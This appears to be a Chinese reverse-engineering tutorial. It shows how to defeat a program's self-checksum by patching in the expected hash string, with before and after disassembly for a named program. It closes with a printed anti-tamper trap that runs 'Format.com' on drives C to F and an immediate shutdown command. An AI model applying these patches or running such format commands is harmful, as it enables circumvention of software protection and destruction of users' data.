

# 一个可以根除自效验极其蝴蝶效应的方法

> 原文：[`www.pediy.com/kssd/pediy11/122422.html`](https://www.pediy.com/kssd/pediy11/122422.html)

自效验我一般直接替换他计算此个文件出来的效验值的字符串  在他入栈的时候  这样就可以根除后边一系列的蝴蝶效应  也就是说 替换了蝴蝶 - - -  方法就是 找到他对此个文件计算出来的效验代码第一次入栈或者转移的地方,然后跳到一个没用的地方,如果这个地方上边有跳转最好 JMP 或者 NOP 掉,防止误入此处引起崩溃,然后把那个地方原来的代码抹去(自效验代码通常都很长),写入正确版本的效验字符串,然后把字串的地址入栈或放到某个寄存器,然后跳回原处,然后....基本就 OK 了  
用这样的方法杀掉了蝴蝶,比阻止飓风更可靠,而且更简便 - - 飓风也就是那些杀窗啊 错误操作啊 关机啊 什么的,但是那些东西都有一个共同点 就是来自于自效验这只小小的蝴蝶- - 而且有些程序不是直接比较明码字串的,而是把计算的结果放到某个地方, 适当的时候他会某个地方给你来下比较 抽其中的某个字符去跟原本的对应字符比较,而且操作上也没什么可用的函数,这个时候,更要找的就是这只蝴蝶了,然后修改此个文件计算出来的字符串结果 给你来段代码  
(修改前文件名字:蚂蚁精灵.修改后名字:KK,在此注释,以示区别)  
  
  
  
\=========================修改前=======================  
修改前 1  这段代码就是一开始感觉没用的地方 直接全部充 00  
0040BAF5  |. /0F8D 72000000 jge 蚂蚁精灵.0040BB6D  
0040BAFB     |6A 00         push 0x0  
0040BAFD     |68 01000000   push 0x1  
0040BB02     |6A FF         push -0x1  
0040BB04     |6A 06         push 0x6  
0040BB06     |68 D1360116   push 0x160136D1  
0040BB0B     |68 01000152   push 0x52010001  
0040BB10     |E8 E1F40200   call 蚂蚁精灵.0043AFF6  
0040BB15     |83C4 18       add esp,0x18  
0040BB18     |6A 01         push 0x1  
0040BB1A     |68 01000000   push 0x1  
0040BB1F     |B8 5C654C00   mov eax,蚂蚁精灵.004C655C                    ;    
0040BB24     |8945 D8       mov dword ptr ss:\[ebp-0x28\],eax  
0040BB27     |8D45 D8       lea eax,dword ptr ss:\[ebp-0x28\]  
0040BB2A     |50            push eax  
0040BB2B     |E8 7D64FFFF   call 蚂蚁精灵.00401FAD  
0040BB30     |8B5D D8       mov ebx,dword ptr ss:\[ebp-0x28\]  
0040BB33     |85DB          test ebx,ebx  
0040BB35     |74 09         je short 蚂蚁精灵.0040BB40  
0040BB37     |53            push ebx  
0040BB38     |E8 8FF40200   call 蚂蚁精灵.0043AFCC  
0040BB3D     |83C4 04       add esp,0x4  
0040BB40     |6A 01         push 0x1  
0040BB42     |68 01000000   push 0x1  
0040BB47     |B8 81654C00   mov eax,蚂蚁精灵.004C6581                    ;  
0040BB4C     |8945 D8       mov dword ptr ss:\[ebp-0x28\],eax  
0040BB4F     |8D45 D8       lea eax,dword ptr ss:\[ebp-0x28\]  
0040BB52     |50            push eax  
0040BB53     |E8 5564FFFF   call 蚂蚁精灵.00401FAD  
0040BB58     |8B5D D8       mov ebx,dword ptr ss:\[ebp-0x28\]  
0040BB5B     |85DB          test ebx,ebx  
0040BB5D     |74 09         je short 蚂蚁精灵.0040BB68  
0040BB5F     |53            push ebx  
0040BB60     |E8 67F40200   call 蚂蚁精灵.0043AFCC  
0040BB65     |83C4 04       add esp,0x4  
0040BB68     |E9 07030000   jmp 蚂蚁精灵.0040BE74  
  
修改前 2  自效验计算完成后把结果字符串转移入栈的地方  
0049CFB6      E8 95000000   call 蚂蚁精灵.0049D050  
0049CFBB      8D4424 0C     lea eax,dword ptr ss:\[esp+0xC\]        //把计算结果转到 EAX  
0049CFBF      50            push eax                               //    EAX 入栈  也就是压入了结果  所以上边的指令也可以 NOP  
  
0049CFC0      E8 8BFFFFFF   call 蚂蚁精灵.0049CF50  
0049CFC5   .  8B4C24 38     mov ecx,dword ptr ss:\[esp+0x38\]  
0049CFC9   .  8901          mov dword ptr ds:\[ecx\],eax  
0049CFCB   .  83C4 34       add esp,0x34  
0049CFCE   .  C3            retn  
  
  
  
\==========================修改后========================  
  
  
  
  
  
修改后 1         修改了最上边的跳转为 JMP 无条件跳过这段代码  
0040BAF5   /EB 76           jmp short kk.0040BB6D         //无条件跳过下边的代码  
0040BAF7   |90                nop  
0040BAF8   |90                nop  
0040BAF9   |90                nop  
0040BAFA   |90                nop  
0040BAFB   |64:61           popad                                //字符串头部,对应 da  
0040BAFD   |34 64           xor al,0x64  
0040BAFF   |3930            cmp dword ptr ds:\[eax\],esi  
0040BB01   |3131            xor dword ptr ds:\[ecx\],esi  
0040BB03   |3166 65         xor dword ptr ds:\[esi+0x65\],esp  
0040BB06   |65:626464 62    bound esp,qword ptr gs:\[esp+0x62\]  
0040BB0B   |386462 65       cmp byte ptr ds:\[edx+0x65\],ah  
0040BB0F   |64:323437       xor dh,byte ptr fs:\[edi+esi\]  
0040BB13   |3365 65         xor esp,dword ptr ss:\[ebp+0x65\]  
0040BB16   |64:             prefix fs:  
0040BB17   |36:6230         bound esi,qword ptr ss:\[eax\]         
0040BB1A   |3300            xor eax,dword ptr ds:\[eax\]            //字符串尾巴,对应 03  
0040BB1C   |68 FBBA4000     push kk.0040BAFB      //这个就是正确的效验值 ASCII "da490111feebddb8dbed2473eed6b03"压入的是头部  
0040BB21   |E8 2A140900     call kk.0049CF50                        //补的代码  
0040BB26   |E9 9A140900     jmp kk.0049CFC5                      !!跳到 0049CFC5    
  
  
  
修改后 2   第一次将效验值字符串压入栈堆的地方  
0049CFBB   .  90                     nop                            //也可以把下边的 JMP 写到这个地方 这样就可以不占用下边 CALL 位置了  
0049CFBC   .  90                     nop  
0049CFBD   .  90                     nop  
0049CFBE   .  90                     nop  
0049CFBF   .^ E9 58EBF6FF    jmp kk.0040BB1C      //跳向 kk.0040BB1C,也就是新的字符串入栈的地方  
0049CFC4      90                    nop                            //上边的 JMP 占用了此处字节,所以这个 CALL 也要在上边补上,然后!!跳到 0049CFC5,也就是下边紧挨着的地址.  
0049CFC5   >  8B4C24 38      mov ecx,dword ptr ss:\[esp+0x38\]  
0049CFC9   .  8901                mov dword ptr ds:\[ecx\],eax  
0049CFCB   .  83C4 34           add esp,0x34  
0049CFCE   .  C3                    retn  
  
ASCII 字符串写法  右键-2 进制-ASCII:XXXXXXXXX   如有需要允许改变大小  
其他类型写法一样  
  
如何对自效验下断找到此处:请下读取文件相关函数,比较常用的有 CreateFileA(对应 A 字符)和 CreateFileW (对应 UN 字符)  
跟踪的时候 在你看到堆栈里有效验值出现的时候 就要注意他前边的 CALL 了  
关键的入栈部分很可能在里边  
  
\=====================================后记====================================  
![](img/29ad22d59eaed8cb2870a8d3a9a3c218.jpg)  
后记:恩恩,上边图中的警告的确是对的,只要修改一个字符,就要在软件运行时面临一系列的错误,而且无止无境,好象永远都改不完,恩恩 的确 我也是在修改了一半的时候想到了这个方法 大家觉得怎么样,还有哇,这个程序没有必要往下破了,因为人家的东西真的是人工的,而且主要的限制功能还是在服务器上的操作的, 所以就算破了好象也只能上人家服务器上报个道吧哈哈- -  
  
  
再扔两个文件效验值查看工具  这里用的就是 MD532, 如果你看到的是 2 进制的字串的话,那么基本上就是 CRC32 的了,用这两个工具主要是原程序是加壳文件的话,查看时会更方便些 

上传的附件
| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || 文件 MD5 和 CRC32 效验值查看工具.rar  
 |

自效验的一些断点  
bp ExitWindowsEx  关机  
bp ExitProcess  退出进程  
AdjustTokenPrivileges 获得系统关机特权  
BP CreateFileA  读文件   
GetDiskGeometry  格式化相关 获得磁盘参数  
  
SHFormatDrive  格式化指定磁盘主要调用 shell32.dll 执行  
\_\_vbaEnd    VB 专用结束函数    
  
rtcShell      VB 专用格式化磁盘相关  
  
以下是某 VB 程序格式化硬盘(低格)暗桩在 OD 中的反汇编代码.反复出现 MSVBVM60.rtcShell,而且莫大的程序中居然只有这一个地方调用,那么他是否也跟 SHELL32.DLL 相关呢?或者 VB 中格式硬盘也会用到呢?所以这个函数也作为 VB 暗桩中一个关键吧- - 当然也不能放弃那些盘符的命令,有的时候是可以直接找到字符串滴 - -   
00660429   .  8D4D DC       lea ecx,dword ptr ss:\[ebp-0x24\]  
0066042C   .  FF15 DC134000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaFreeS>;  MSVBVM60.\_\_vbaFreeStr  
00660432   .  C745 FC 0A000>mov dword ptr ss:\[ebp-0x4\],0xA  
00660439   .  C745 BC C0BD4>mov dword ptr ss:\[ebp-0x44\],中.0043BDC0   ;  UNICODE "Format.com d: /q/y"  
00660440   .  C745 B4 08000>mov dword ptr ss:\[ebp-0x4C\],0x8  
00660447   .  8D55 B4       lea edx,dword ptr ss:\[ebp-0x4C\]  
0066044A   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
0066044D   .  FF15 44134000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaVarDu>;  MSVBVM60.\_\_vbaVarDup  
00660453   .  6A 00         push 0x0  
00660455   .  8D55 C4       lea edx,dword ptr ss:\[ebp-0x3C\]  
00660458   .  52            push edx  
00660459   .  FF15 F4114000 call dword ptr ds:\[<&MSVBVM60.#600>\]     ;  MSVBVM60.rtcShell  
0066045F   .  DD5D AC       fstp qword ptr ss:\[ebp-0x54\]  
00660462   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
00660465   .  FF15 30104000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaFreeV>;  MSVBVM60.\_\_vbaFreeVar  
0066046B   .  C745 FC 0B000>mov dword ptr ss:\[ebp-0x4\],0xB  
00660472   .  C745 BC ECBD4>mov dword ptr ss:\[ebp-0x44\],中.0043BDEC   ;  UNICODE "Format.com e: /q/y"  
00660479   .  C745 B4 08000>mov dword ptr ss:\[ebp-0x4C\],0x8  
00660480   .  8D55 B4       lea edx,dword ptr ss:\[ebp-0x4C\]  
00660483   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
00660486   .  FF15 44134000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaVarDu>;  MSVBVM60.\_\_vbaVarDup  
0066048C   .  6A 00         push 0x0  
0066048E   .  8D45 C4       lea eax,dword ptr ss:\[ebp-0x3C\]  
00660491   .  50            push eax  
00660492   .  FF15 F4114000 call dword ptr ds:\[<&MSVBVM60.#600>\]     ;  MSVBVM60.rtcShell  
00660498   .  DD5D AC       fstp qword ptr ss:\[ebp-0x54\]  
0066049B   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
0066049E   .  FF15 30104000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaFreeV>;  MSVBVM60.\_\_vbaFreeVar  
006604A4   .  C745 FC 0C000>mov dword ptr ss:\[ebp-0x4\],0xC  
006604AB   .  C745 BC 18BE4>mov dword ptr ss:\[ebp-0x44\],中.0043BE18   ;  UNICODE "Format.com f: /q/y"  
006604B2   .  C745 B4 08000>mov dword ptr ss:\[ebp-0x4C\],0x8  
006604B9   .  8D55 B4       lea edx,dword ptr ss:\[ebp-0x4C\]  
006604BC   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
006604BF   .  FF15 44134000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaVarDu>;  MSVBVM60.\_\_vbaVarDup  
006604C5   .  6A 00         push 0x0  
006604C7   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
006604CA   .  51            push ecx  
006604CB   .  FF15 F4114000 call dword ptr ds:\[<&MSVBVM60.#600>\]     ;  MSVBVM60.rtcShell  
006604D1   .  DD5D AC       fstp qword ptr ss:\[ebp-0x54\]  
006604D4   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
006604D7   .  FF15 30104000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaFreeV>;  MSVBVM60.\_\_vbaFreeVar  
006604DD   .  C745 FC 0D000>mov dword ptr ss:\[ebp-0x4\],0xD  
006604E4   .  C745 BC 44BE4>mov dword ptr ss:\[ebp-0x44\],中.0043BE44   ;  UNICODE "Format.com c: /q/y"  
006604EB   .  C745 B4 08000>mov dword ptr ss:\[ebp-0x4C\],0x8  
006604F2   .  8D55 B4       lea edx,dword ptr ss:\[ebp-0x4C\]  
006604F5   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
006604F8   .  FF15 44134000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaVarDu>;  MSVBVM60.\_\_vbaVarDup  
006604FE   .  6A 00         push 0x0  
00660500   .  8D55 C4       lea edx,dword ptr ss:\[ebp-0x3C\]  
00660503   .  52            push edx  
00660504   .  FF15 F4114000 call dword ptr ds:\[<&MSVBVM60.#600>\]     ;  MSVBVM60.rtcShell  
0066050A   .  DD5D AC       fstp qword ptr ss:\[ebp-0x54\]  
0066050D   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
00660510   .  FF15 30104000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaFreeV>;  MSVBVM60.\_\_vbaFreeVar  
00660516   .  C745 FC 0E000>mov dword ptr ss:\[ebp-0x4\],0xE  
0066051D   .  C745 BC 88BE4>mov dword ptr ss:\[ebp-0x44\],中.0043BE88   ;  UNICODE "cmd /c shutdown -s -t 0"  
00660524   .  C745 B4 08000>mov dword ptr ss:\[ebp-0x4C\],0x8  
0066052B   .  8D55 B4       lea edx,dword ptr ss:\[ebp-0x4C\]  
0066052E   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
00660531   .  FF15 44134000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaVarDu>;  MSVBVM60.\_\_vbaVarDup  
00660537   .  6A 00         push 0x0  
00660539   .  8D45 C4       lea eax,dword ptr ss:\[ebp-0x3C\]  
0066053C   .  50            push eax  
0066053D   .  FF15 F4114000 call dword ptr ds:\[<&MSVBVM60.#600>\]     ;  MSVBVM60.rtcShell  
00660543   .  DD5D AC       fstp qword ptr ss:\[ebp-0x54\]  
00660546   .  8D4D C4       lea ecx,dword ptr ss:\[ebp-0x3C\]  
00660549   .  FF15 30104000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaFreeV>;  MSVBVM60.\_\_vbaFreeVar  
0066054F   .  C745 FC 0F000>mov dword ptr ss:\[ebp-0x4\],0xF  
00660556   .  FF15 44104000 call dword ptr ds:\[<&MSVBVM60.\_\_vbaEnd>\] ;  MSVBVM60.\_\_vbaEnd  
0066055C   >  9B            wait  
0066055D   .  68 8B056600   push 中.0066058B